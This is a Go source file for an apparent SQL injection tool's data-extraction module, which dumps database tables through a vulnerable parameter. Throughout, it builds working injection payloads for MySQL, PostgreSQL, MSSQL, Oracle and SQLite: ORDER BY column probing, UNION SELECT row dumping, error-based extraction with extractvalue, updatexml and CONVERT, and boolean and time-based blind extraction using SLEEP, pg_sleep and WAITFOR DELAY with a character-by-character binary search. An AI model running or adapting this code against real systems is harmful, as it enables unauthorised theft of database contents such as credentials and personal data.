package modules

import (
	"fmt"
	"regexp"
	"strings"
	"sync"
	"time"
)

type Extractor struct {
	Engine EngineInterface
}

func NewExtractor(e EngineInterface) *Extractor {
	return &Extractor{Engine: e}
}

func (ex *Extractor) DumpTable(db, table string, vulnParam string, dbms string) ([][]string, error) {
	ex.Engine.GetLogger().Info(fmt.Sprintf("Dumping data from %s.%s for %s...", db, table, dbms))

	enum := NewEnumerator(ex.Engine)
	cols, err := enum.ListColumns(db, table, vulnParam, dbms)
	if err != nil || len(cols) == 0 {
		return ex.blindDumpTable(db, table, vulnParam, dbms)
	}

	results := [][]string{cols}
	maxRows := 500

	if rows := ex.tryUnionDump(db, table, cols, vulnParam, dbms, maxRows); len(rows) > 1 {
		return append(results, rows[1:]...), nil
	}

	if rows := ex.tryErrorDump(db, table, cols, vulnParam, dbms, maxRows); len(rows) > 1 {
		return append(results, rows[1:]...), nil
	}

	if rows := ex.tryMSSQLDump(db, table, cols, vulnParam, maxRows); len(rows) > 1 {
		return append(results, rows[1:]...), nil
	}

	ex.Engine.GetLogger().Warning("Structured extraction failed, trying blind...")
	return ex.blindDumpTable(db, table, vulnParam, dbms)
}

func (ex *Extractor) detectColumnCount(vulnParam, dbms string) int {
	baseBody, baseLen, _, err := ex.Engine.Request("", "")
	if err != nil {
		return 0
	}
	_ = baseBody

	prefixes := []string{"' ORDER BY ", "\" ORDER BY ", ") ORDER BY ", "' ORDER BY "}
	commentStyles := []string{"-- ", "--+", "--", "#", "/*", ";"}

	for _, prefix := range prefixes {
		for _, comment := range commentStyles {
			for cols := 1; cols <= 25; cols++ {
				payload := fmt.Sprintf("%s%d %s", prefix, cols, comment)
				body, bodyLen, _, err := ex.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}
				errKeywords := []string{"error", "order", "unknown column", "syntax",
					"mysql_fetch", "unclosed", "incorrect"}
				isErr := false
				for _, kw := range errKeywords {
					if strings.Contains(strings.ToLower(body), kw) {
						isErr = true
						break
					}
				}
				if isErr || (bodyLen > 0 && bodyLen < baseLen-80) {
					if cols > 1 {
						return cols - 1
					}
				}
			}
		}
	}
	return 0
}

func (ex *Extractor) tryUnionDump(db, table string, cols []string, vulnParam, dbms string, maxRows int) [][]string {
	colCount := ex.detectColumnCount(vulnParam, dbms)
	if colCount < 1 {
		return nil
	}

	colStr := buildColString(dbms, cols)
	dbRef := db
	if dbRef == "" || dbRef == "current" {
		dbRef = "current"
	}

	var results [][]string
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 10)

	for rowOffset := 0; rowOffset < maxRows; rowOffset++ {
		wg.Add(1)
		sem <- struct{}{}
		go func(offset int) {
			defer wg.Done()
			defer func() { <-sem }()

			var foundRow []string
			for _, quote := range []string{"'", "\"", "')", "\")", "'))", "\"))"} {
				for _, colPos := range []int{0, colCount - 1, colCount / 2} {
					nulls := make([]string, colCount)
					for j := range nulls {
						nulls[j] = "NULL"
					}
					if colPos < len(nulls) {
						nulls[colPos] = colStr
					}

					var fromClause string
					if dbRef == "current" {
						fromClause = table
					} else {
						fromClause = fmt.Sprintf("%s.%s", db, table)
					}

					unionSQL := fmt.Sprintf("%s UNION SELECT %s FROM %s LIMIT 1 OFFSET %d-- ",
						quote, strings.Join(nulls, ","), fromClause, offset)

					body, bodyLen, _, err := ex.Engine.Request(unionSQL, vulnParam)
					if err != nil || bodyLen < 50 {
						continue
					}

					parts := extractColValues(body)
					if len(parts) > 0 {
						foundRow = parts
						return
					}
				}
				if foundRow != nil {
					break
				}
			}

			if foundRow != nil {
				mu.Lock()
				results = append(results, foundRow)
				mu.Unlock()
			}
		}(rowOffset)
	}
	wg.Wait()

	if len(results) > maxRows {
		return results[:maxRows]
	}
	return results
}

func (ex *Extractor) tryErrorDump(db, table string, cols []string, vulnParam, dbms string, maxRows int) [][]string {
	colStr := buildColString(dbms, cols)
	dbRef := db
	if dbRef == "" || dbRef == "current" {
		dbRef = "current"
	}

	var results [][]string
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 10)

	templates := ex.errorTemplates(dbms, colStr, dbRef, table)

	for _, tmpl := range templates {
		if len(results) > 0 {
			break
		}
		for offset := 0; offset < maxRows; offset++ {
			wg.Add(1)
			sem <- struct{}{}
			go func(t string, tbl string, off int) {
				defer wg.Done()
				defer func() { <-sem }()
				payload := fmt.Sprintf(t, tbl, off)
				body, _, _, err := ex.Engine.Request(payload, vulnParam)
				if err != nil {
					return
				}
				vals := extractErrorValues(body)
				if len(vals) > 0 {
					mu.Lock()
					results = append(results, vals)
					mu.Unlock()
				}
			}(tmpl, table, offset)
		}
		wg.Wait()
	}
	return results
}

func (ex *Extractor) errorTemplates(dbms, colStr, dbRef, table string) []string {
	switch dbms {
	case "MySQL", "MariaDB":
		return []string{
			fmt.Sprintf("' AND extractvalue(1,concat(0x7e,(SELECT %s FROM %s.%%s LIMIT 1 OFFSET %%d),0x7e))-- -", colStr, dbRef),
			fmt.Sprintf("' AND updatexml(1,concat(0x7e,(SELECT %s FROM %s.%%s LIMIT 1 OFFSET %%d),0x7e),1)-- -", colStr, dbRef),
		}
	case "PostgreSQL":
		return []string{
			fmt.Sprintf("' AND CAST((SELECT %s FROM %%s LIMIT 1 OFFSET %%d) AS INT)=1-- -", colStr),
		}
	case "Oracle":
		return []string{
			fmt.Sprintf("' AND 1=utl_inaddr.get_host_name((SELECT %s FROM (SELECT %s, ROWNUM r FROM %%s) WHERE r=%%d))-- -", colStr, colStr),
		}
	case "MSSQL":
		return []string{
			fmt.Sprintf("' AND 1=CONVERT(int, (SELECT TOP 1 %s FROM %%s ORDER BY 1 OFFSET %%d ROWS FETCH NEXT 1 ROWS ONLY))-- -", colStr),
		}
	default:
		return nil
	}
}

func (ex *Extractor) tryMSSQLDump(db, table string, cols []string, vulnParam string, maxRows int) [][]string {
	if len(cols) == 0 {
		return nil
	}
	var results [][]string
	mssqlCols := make([]string, len(cols))
	for i, c := range cols {
		mssqlCols[i] = fmt.Sprintf("ISNULL(CAST(%s AS VARCHAR(MAX)), 'NULL')", c)
	}
	colStr := strings.Join(mssqlCols, "+':'+")

	for i := 0; i < maxRows; i++ {
		var payload string
		if i == 0 {
			payload = fmt.Sprintf("' AND 1=CONVERT(int, (SELECT TOP 1 %s FROM %s))-- -", colStr, table)
		} else {
			payload = fmt.Sprintf("' AND 1=CONVERT(int, (SELECT TOP 1 %s FROM %s WHERE %s NOT IN (SELECT TOP %d %s FROM %s)))-- -",
				colStr, table, cols[0], i, cols[0], table)
		}
		body, _, _, err := ex.Engine.Request(payload, vulnParam)
		if err != nil {
			continue
		}
		extracted := extractBetween(body, "value '", "' to")
		if extracted != "" {
			row := strings.Split(extracted, ":")
			results = append(results, row)
		} else if i > 10 && len(results) == 0 {
			break
		}
	}
	return results
}

func (ex *Extractor) blindDumpTable(db, table string, vulnParam string, dbms string) ([][]string, error) {
	ex.Engine.GetLogger().Warning(fmt.Sprintf("Using blind binary-search extraction for %s.%s", db, table))

	cols := []string{"*"}
	enum := NewEnumerator(ex.Engine)
	if c, err := enum.ListColumns(db, table, vulnParam, dbms); err == nil && len(c) > 0 {
		cols = c
	}

	results := [][]string{cols}
	maxRows := 50

	for i := 0; i < maxRows; i++ {
		row := ex.blindExtractRow(db, table, cols, vulnParam, dbms, i)
		if len(row) > 0 {
			results = append(results, row)
		} else if i > 3 {
			break
		}
	}
	return results, nil
}

func (ex *Extractor) blindExtractRow(db, table string, cols []string, vulnParam, dbms string, offset int) []string {
	var row []string
	for _, col := range cols {
		val := ex.blindExtractValue(db, table, col, vulnParam, dbms, offset, 64)
		if val != "" {
			row = append(row, val)
		} else {
			break
		}
	}
	return row
}

func (ex *Extractor) blindExtractValue(db, table, column, vulnParam, dbms string, offset, maxLen int) string {
	// Detect oracle first
	oracle := ex.detectBlindOracle(vulnParam, dbms)
	if oracle == "" {
		return ""
	}

	// Try error-based first for speed
	if val := ex.blindErrorExtract(db, table, column, vulnParam, dbms, offset); val != "" {
		return val
	}

	var result strings.Builder
	for pos := 1; pos <= maxLen; pos++ {
		found := false
		ch := byte(0)
		low, high := 32, 126

		for low <= high {
			mid := (low + high) / 2
			payload := ex.buildBlindPayload(db, table, column, vulnParam, dbms, offset, pos, mid, oracle)
			if payload == "" {
				return ""
			}
			matched := ex.testBlindCondition(payload, vulnParam, oracle)
			if matched {
				low = mid + 1
			} else {
				high = mid - 1
			}
		}

		if low >= 32 && low <= 126 {
			ch = byte(low)
			result.WriteByte(ch)
			found = true
		}

		if !found {
			break
		}
	}
	return result.String()
}

func (ex *Extractor) detectBlindOracle(vulnParam, dbms string) string {
	truePayload, falsePayload := "", ""
	switch dbms {
	case "MySQL", "MariaDB":
		truePayload = "' AND 1=1-- "
		falsePayload = "' AND 1=2-- "
	case "PostgreSQL", "CockroachDB":
		truePayload = "' AND 1=1-- "
		falsePayload = "' AND 1=2-- "
	case "MSSQL":
		truePayload = "' AND 1=1-- "
		falsePayload = "' AND 1=2-- "
	case "Oracle":
		truePayload = "' AND 1=1-- "
		falsePayload = "' AND 1=2-- "
	case "SQLite":
		truePayload = "' AND 1=1-- "
		falsePayload = "' AND 1=2-- "
	default:
		truePayload = "' AND 1=1-- "
		falsePayload = "' AND 1=2-- "
	}

	trueBody, trueLen, _, err := ex.Engine.Request(truePayload, vulnParam)
	if err != nil {
		return ""
	}
	falseBody, falseLen, _, err := ex.Engine.Request(falsePayload, vulnParam)
	if err != nil {
		return ""
	}

	if trueLen != falseLen {
		return "boolean"
	}
	_ = trueBody
	_ = falseBody

	// Try time-based
	timePayload := "' AND SLEEP(5)-- "
	start := time.Now()
	ex.Engine.Request(timePayload, vulnParam)
	if time.Since(start) >= 4*time.Second {
		return "time"
	}

	return "boolean"
}

func (ex *Extractor) testBlindCondition(payload, vulnParam, oracleType string) bool {
	switch oracleType {
	case "boolean":
		baseBody, baseLen, _, err := ex.Engine.Request("", "")
		if err != nil {
			return false
		}
		_ = baseBody
		testBody, testLen, _, err := ex.Engine.Request(payload, vulnParam)
		if err != nil {
			return false
		}
		_ = testBody
		return testLen > baseLen+20

	case "time":
		start := time.Now()
		ex.Engine.Request(payload, vulnParam)
		return time.Since(start) >= 4*time.Second

	default:
		return false
	}
}

func (ex *Extractor) buildBlindPayload(db, table, column, vulnParam, dbms string, offset, pos, mid int, oracleType string) string {
	switch dbms {
	case "MySQL", "MariaDB":
		if oracleType == "time" {
			return fmt.Sprintf("' AND IF(ASCII(SUBSTR((SELECT %s FROM %s.%s LIMIT 1 OFFSET %d),%d,1))>%d,SLEEP(5),0)-- ", column, db, table, offset, pos, mid)
		}
		return fmt.Sprintf("' AND ASCII(SUBSTR((SELECT %s FROM %s.%s LIMIT 1 OFFSET %d),%d,1))>%d-- ", column, db, table, offset, pos, mid)
	case "PostgreSQL", "CockroachDB":
		if oracleType == "time" {
			return fmt.Sprintf("' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT %s FROM %s LIMIT 1 OFFSET %d),%d,1))>%d THEN pg_sleep(5) ELSE 0 END)-- ", column, table, offset, pos, mid)
		}
		return fmt.Sprintf("' AND ASCII(SUBSTR((SELECT %s FROM %s LIMIT 1 OFFSET %d),%d,1))>%d-- ", column, table, offset, pos, mid)
	case "MSSQL":
		if oracleType == "time" {
			return fmt.Sprintf("' IF(ASCII(SUBSTRING((SELECT %s FROM %s ORDER BY (SELECT NULL) OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY),%d,1))>%d) WAITFOR DELAY '0:0:5'-- ", column, table, offset, pos, mid)
		}
		return fmt.Sprintf("' AND ASCII(SUBSTRING((SELECT %s FROM %s ORDER BY (SELECT NULL) OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY),%d,1))>%d-- ", column, table, offset, pos, mid)
	case "Oracle":
		return fmt.Sprintf("' AND ASCII(SUBSTR((SELECT %s FROM %s WHERE ROWNUM=1),%d,1))>%d-- ", column, table, pos, mid)
	case "SQLite":
		return fmt.Sprintf("' AND UNICODE(SUBSTR((SELECT %s FROM %s LIMIT 1 OFFSET %d),%d,1))>%d-- ", column, table, offset, pos, mid)
	default:
		return ""
	}
}

func (ex *Extractor) blindErrorExtract(db, table, column, vulnParam, dbms string, offset int) string {
	if dbms != "MySQL" && dbms != "MariaDB" {
		return ""
	}
	payload := fmt.Sprintf("' AND extractvalue(1,concat(0x7e,(SELECT %s FROM %s.%s LIMIT 1 OFFSET %d),0x7e))-- -",
		column, db, table, offset)
	body, _, _, err := ex.Engine.Request(payload, vulnParam)
	if err != nil {
		return ""
	}
	re := regexp.MustCompile(`~([^~]+)~`)
	matches := re.FindStringSubmatch(body)
	if len(matches) > 1 {
		return matches[1]
	}
	return ""
}

func buildColString(dbms string, cols []string) string {
	if len(cols) == 0 {
		return "1"
	}
	switch dbms {
	case "MySQL", "MariaDB":
		if len(cols) == 1 {
			return cols[0]
		}
		return fmt.Sprintf("CONCAT_WS(':',%s)", strings.Join(cols, ","))
	case "PostgreSQL":
		if len(cols) == 1 {
			return fmt.Sprintf("COALESCE(%s::text,'')", cols[0])
		}
		parts := make([]string, len(cols))
		for i, c := range cols {
			parts[i] = fmt.Sprintf("COALESCE(%s::text,'')", c)
		}
		return fmt.Sprintf("CONCAT_WS(':'::text,%s)", strings.Join(parts, ","))
	case "MSSQL":
		casted := make([]string, len(cols))
		for i, c := range cols {
			casted[i] = fmt.Sprintf("ISNULL(CAST(%s AS VARCHAR(MAX)),'')", c)
		}
		return strings.Join(casted, "+':'+")
	case "Oracle":
		parts := make([]string, len(cols))
		for i, c := range cols {
			parts[i] = fmt.Sprintf("NVL(TO_CHAR(%s),'')", c)
		}
		return strings.Join(parts, "||':'||")
	case "SQLite":
		if len(cols) == 1 {
			return fmt.Sprintf("IFNULL(%s,'')", cols[0])
		}
		parts := make([]string, len(cols))
		for i, c := range cols {
			parts[i] = fmt.Sprintf("IFNULL(%s,'')", c)
		}
		return strings.Join(parts, "||':'||")
	default:
		return strings.Join(cols, ",")
	}
}

func extractColValues(body string) []string {
	var results []string
	re := regexp.MustCompile(`([0-9]+:[0-9]+:[0-9]+|[\w@\.\-]+(?::[\w@\.\-]+)*)`)
	matches := re.FindAllString(body, -1)
	for _, m := range matches {
		if strings.Contains(m, ":") && len(m) > 3 {
			parts := strings.Split(m, ":")
			for _, p := range parts {
				if p != "" {
					results = append(results, p)
				}
			}
			if len(results) > 0 {
				return results
			}
		}
	}
	return nil
}

func extractErrorValues(body string) []string {
	re := regexp.MustCompile(`~([^~]+)~`)
	matches := re.FindAllStringSubmatch(body, -1)
	for _, m := range matches {
		if len(m) > 1 && m[1] != "" {
			return strings.Split(m[1], ":")
		}
	}

	patterns := []*regexp.Regexp{
		regexp.MustCompile(`Duplicate\s+entry\s+'([^']+)'`),
		regexp.MustCompile(`value\s+'([^']+)'\s+to`),
		regexp.MustCompile(`integer:\s+"([^"]+)"`),
		regexp.MustCompile(`Column\s+'([^']+)'`),
	}
	for _, pat := range patterns {
		matches := pat.FindAllStringSubmatch(body, -1)
		for _, m := range matches {
			if len(m) > 1 && m[1] != "" {
				return strings.Split(m[1], ":")
			}
		}
	}
	return nil
}


